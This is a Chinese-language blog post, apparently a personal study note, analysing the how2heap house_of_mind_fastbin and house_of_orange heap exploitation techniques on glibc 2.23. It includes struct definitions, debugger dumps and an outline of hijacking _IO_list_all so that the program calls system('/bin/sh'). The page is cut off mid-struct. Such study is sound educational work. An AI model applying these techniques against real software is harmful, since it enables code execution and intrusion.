<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s Pwnhome">
<meta property="og:url" content="http://hornos3.github.com/page/2/index.html">
<meta property="og:site_name" content="CoLin&#39;s Pwnhome">
<meta property="og:locale">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh'
  };
</script>

  <title>CoLin's Pwnhome</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's Pwnhome</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-2/" class="post-title-link" itemprop="url">how2heap 深入学习(2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:15 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:15+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>how2heap下载网址: <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">传送门</a><br />
Glibc源码查看网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br />
参考书籍：CTF竞赛权威指南-pwn篇</p>
<p>测试环境：Ubuntu 16.04<br />
Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
<p>按照顺序，本文分析glibc 2_23文件夹中的第7~8个源码。这两种攻击方式初见比较绕人，也比较难，因此也花了不少时间消化与理解。<br />
<img src="https://img-blog.csdnimg.cn/aaea8e3113c34658b4fd9b629526eb38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="" /></p>
<h1 id="7-house_of_mind_fastbin"><a class="markdownIt-Anchor" href="#7-house_of_mind_fastbin"></a> 7. house_of_mind_fastbin</h1>
<p>这是一种较为复杂，不太常见的堆漏洞。原文件中的解释翻译大致如下（英语水平有限，很多地方自己都看不懂…）：</p>
<pre><code>这种攻击与传统的house of mind类似，后者使用一个假的非主线程所占有的arena来向一个新的地址写入。而前者使用的是fastbin作为写入的地址。
如果能够分配任意数量的chunk，且对于chunk的size域有一字节的溢出，我们就可以控制很多东西。
这可以被用来覆写一个已经被free的chunk到一个任意地址，或者可以在任意地址写入一个超大整数值。
chunks的size域中低3 bit存放的是控制信息，由低到高分别为prev_inuse、mmap、non_main arena。使用non_main arena是本攻击的重点。
首先，我们需要知道chunk是怎么知道自己不是主线程的arena。
下面是_heap_info结构体的声明：
</code></pre>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr;           <span class="comment">// Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">// Previous heap.</span></span><br><span class="line">  <span class="type">size_t</span> size;            <span class="comment">// Current size in bytes.</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size;   <span class="comment">// Size in bytes that has been mprotected</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; <span class="comment">// Proper alignment</span></span><br><span class="line">&#125; heap_info; </span><br></pre></td></tr></table></figure>
<pre><code>这里有一个值得注意的点是arena中的malloc_state是通过ar_ptr获取的，这是该结构体的第一个元素。malloc_state == mstate == arena。
main arena有一个特殊的指针。但是，非main arenas在一个堆段的起始处。它们通过下面的代码获取，这里也是用户控制arena_for_chunk中ptr的地方。
</code></pre>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="meta">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br></pre></td></tr></table></figure>
<pre><code>这个宏获取了ptr然后减去了一个大数，因为heap_info应该在整个堆段的开头。那么通过使用这个，程序就可以找到需要使用的arena。
这个攻击的想法是使用一个假的arena来写一个指针到一个地址，这个地址在free掉fastbin时滥用了arena_for_chunk的功能。

这个攻击做了如下事情：
1. 找到一个可用的arena地址作为non_main arena的地址
2. 分配足够的chunk来到达这个non_main arena的位置，在那个位置我们可以控制arena控制字段的值
3. 创建一个假的_heap_info来指明之后要使用的at_ptr
4. 使用这个假的arena(ar_ptr)，我们使用fastbin，配合一个堆指针向一个ar_ptr不期望写入的地址写入。

进行这个攻击的前提条件：
1. 一个堆区地址的泄露，以知道假的_heap_info在什么地方（需要有可能避免特殊的喷射技术）
2. 无限制分配堆空间的能力
3. 一字节的溢出到下一个chunk的size处（需要能够放入fastbin中，因此如果有tcache需要首先填满tcache）
4. malloc state（ar_ptr）的地址需要是一个大于在malloc_state.system_mem中被free的fastbin大小的值，否则这个chunk会被认为无效（这可以通过排列值完成）
5. 下一个chunk，已经被free，必须有一个有效的size值（大于0x20且小于malloc_state.system_mem）
</code></pre>
<p>看完这一大段话我是一脸懵逼的，不知所云。程序中说的是产生一个<code>constrained WRITE-WHERE primitive</code>。算了，叫什么名词无所谓，看他是怎么玩的。</p>
<p>跟着程序单步走，在进入while循环之前栈的结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7fffffffe450 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">01:0008│     0x7fffffffe458 ◂— 0x1ff0004000000	;MAX_SIZE | HEAP_MAX_SIZE</span><br><span class="line">02:0010│     0x7fffffffe460 ◂— 0x604430 ◂— 0x0	;user_mem</span><br><span class="line">03:0018│     0x7fffffffe468 —▸ 0x603420 ◂— 0x0	;fake_arena	</span><br><span class="line">04:0020│     0x7fffffffe470 —▸ 0x603448 ◂— 0x0	;target_loc</span><br><span class="line">05:0028│     0x7fffffffe478 —▸ 0x603410 ◂— 0x0	;target_chunk</span><br><span class="line">06:0030│     0x7fffffffe480 ◂— 0x4000000		;new_arena_value</span><br><span class="line">07:0038│     0x7fffffffe488 ◂— 0x4000000		;fake_heap_info</span><br><span class="line">08:0040│     0x7fffffffe490 —▸ 0x7fffffffe580 ◂— 0x1</span><br><span class="line">09:0048│     0x7fffffffe498 ◂— 0x0</span><br><span class="line">0a:0050│ rbp 0x7fffffffe4a0 —▸ 0x4008c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">0b:0058│     0x7fffffffe4a8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>
<p>之后进入循环一直分配大小为<code>MAX_SIZE==0x1FF00</code>大小的chunk直到分配到的chunk的地址大于<code>new_arena_value==0x4000000</code>。然后<code>malloc(0x50)</code>，将上述stack中08:0040处赋值为fastbin chunk的值（测试为0x4028F50）。之后，程序对0x4000000处进行了写操作，这里是要作为假的arena，因此有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_heap_info[0] = (uint64_t) fake_arena; // Setting the fake ar_ptr (arena)</span><br></pre></td></tr></table></figure>
<p>将假_heap_info的第一个字段（ar_ptr）设置为假的arena所在处（0x603420）。调试显示，在没有攻击时，被攻击地址（0x603448）处的值为0，然后将那个最后分配的chunk的size中的non_main arena位修改为1。最后，将这个fastbin释放，然后就可以看到目标地址处被写入了fastbin的地址，成功将其修改为一个较大的值。</p>
<p>看到这里，已经大概明白了。实际上就是伪造一个malloc_state结构体在chunk中，然后欺骗free让它将bins链入这个假的arena中。因为malloc_state是arena所有控制字段以及bins的头指针所在的地方，具体定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里需要注意为什么这个fastbin会修改到0x603448的值。查看mutex_t的定义知道这就是int类型，后面的flags也是一个int类型。紧随其后的fastbinsY是按照fastbin的大小链入的，从0x20大小开始。</p>
<table align=center>
	<tr align=center>
		<td> addr </td> <td> 0x0 </td> <td> 0x4 </td> <td> 0x8 </td> <td> 0xC </td>
	</tr>
	<tr align=center>
		<td> 0x603420 </td> <td> mutex </td> <td> flag </td> <td colspan=2> fastbinsY[0] (for chunk size=0x20) </td>
	</tr>
	<tr align=center>
		<td> 0x603430 </td> <td colspan=2> fastbinsY[1] (for chunk size=0x30) </td> <td colspan=2> fastbinsY[2] (for chunk size=0x40) </td>
	</tr>
	<tr align=center>
		<td> 0x603440 </td> <td colspan=2> fastbinsY[3] (for chunk size=0x50) </td> <td colspan=2> <font color=red>fastbinsY[4] (for chunk size=0x60) </font> </td>
	</tr>
	<tr align=center>
		<td> ...... </td> <td colspan=2> ...... </td> <td colspan=2> ...... </td>
	</tr>
</table>
<p>由于释放的chunk大小为0x60，因此它被链入fastbinsY[4]的开头，而fastbinsY[4]的地址正好就是0x603448，这样要攻击的地址的值就被成功修改了。</p>
<p>综上所述，这种攻击的局限性较大，不仅前提条件很多，而且还不能任意修改值，在题目中可能会作为一种辅助的攻击手段来使用。其中最关键的两步就是修改了0x4000000处和fastbin的non_main arena的值。</p>
<h1 id="8-house_of_orange"><a class="markdownIt-Anchor" href="#8-house_of_orange"></a> 8. House_of_orange</h1>
<p>在how2heap的注释说明中，这个漏洞已经在glibc 2.24被修复。</p>
<blockquote>
<p>（摘自参考书籍）<br />
这是一种FSOP（File Stream Oriented Programming），劫持_IO_list_all来伪造链表的利用技术，通过调用_IO_flush_all_lockp函数触发。该函数在以下3种情况触发：libc检测到内存错误从而执行abort流程时、执行exit函数时、main函数返回时。（源码演示的是第一种）</p>
</blockquote>
<p>乍一看，这个漏洞的执行流程较为复杂。要理解house_of_orange，首先要明确当需要分配的chunk大小大于top chunk会怎样。</p>
<p>在malloc函数中，当所有的freed chunk均不能满足分配时，会检查top chunk，这通过调用sysmalloc来实现。查看了一下sysmalloc函数，发现里面的判断关系很复杂。按照how2heap源码中的说法，在这里会将被缩小的top chunk释放，前提是top chunk的尾部需要是一页的尾部（即紧跟top chunk后面的地址是0x1000的整数倍）。源码中将top chunk的大小从0x20C01改为0xC01，然后分配大小为0x1000的堆块。但是通过自己写代码测试发现，在堆正常工作时，即使top chunk的大小也是0xC01，下一个分配的堆块也是0x1000大小，所有的chunk还是紧密连接，且没有一个chunk在bin中。</p>
<p><img src="https://img-blog.csdnimg.cn/fa040cdfc24945b2a1764c8205b676f8.png#pic_center" alt="" /></p>
<p>看来这里面的逻辑有更加复杂的一些方面，即使是看源代码也不容易进行分析。最后还是在书中找到了答案。</p>
<blockquote>
<p>sysmalloc函数调用时会发生两种情况：第一种调用sbrk函数直接扩充top chunk，第二种调用mmap函数分配一块新的top chunk。为了能够使用前一种扩展chunk，需要请求小于阈值mp_.mmap_threshold。<br />
同时，为了能够调用sysmalloc函数中的_int_free函数，需要top chunk在减去一个防止fencepost的MINSIZE后，还要大于MAXSIZE，即0x20；如果是main_arena，则需要放置两个fencepost。还需要绕过两个assert：满足old_size小于nb+MINSIZE，prev_inuse标志位为1，以及old_top+old_size页对齐。</p>
</blockquote>
<p>虽然还是有些懵，但先往下看。</p>
<p>运行how2heap源码，分配0x1000后显示的堆信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x602000</span><br><span class="line">Size: 0x401</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x602400</span><br><span class="line">Size: 0xbe1</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x602fe0</span><br><span class="line">Size: 0x10</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x602ff0</span><br><span class="line">Size: 0x11</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<p>分配0x1000之后，源码注释里面写到下面假设这个unsorted bin能够被写。那也就是说这个地方不一定要通过上面的方法获取unsorted bin，有可能通过其他方式获得的unsorted bin也能进行后续操作，这个示例只是不使用free函数就获得了unsorted bin中的chunk而已。还是先往下看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这种攻击利用的是中止程序的函数。当程序异常中止时，会将所有文件指针清空，通过调用_IO_flush_all_lockp实现，最终遍历_IO_list_all并调用_IO_OVERFLOW函数。</span><br><span class="line">这种攻击的思路是用一个假的文件指针覆写_IO_list_all指针，它的_IO_OVERFLOW指向的是system函数，且开头8字节被设定为&#x27;/bin/sh&#x27;。因此调用_IO_OVERFLOW(fp, EOF)就是调用system(&#x27;/bin/sh&#x27;)。</span><br><span class="line">_IO_list_all的地址可以通过unsorted bin的fd和bk指针获取（当unsorted bin中仅有一个chunk时，这个chunk的fd和bk指针均指向main_arena + 0x88处【仅限glibc 2.23】）。源代码中_IO_list_all在其之后0x9A8处。</span><br></pre></td></tr></table></figure>
<p>其中操作的文件结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *<span class="title">IO_list_all</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>	<span class="comment">// 这个是进程FILE的指针域，通过这个指针链接形成链表，表头为_IO_list_all</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span 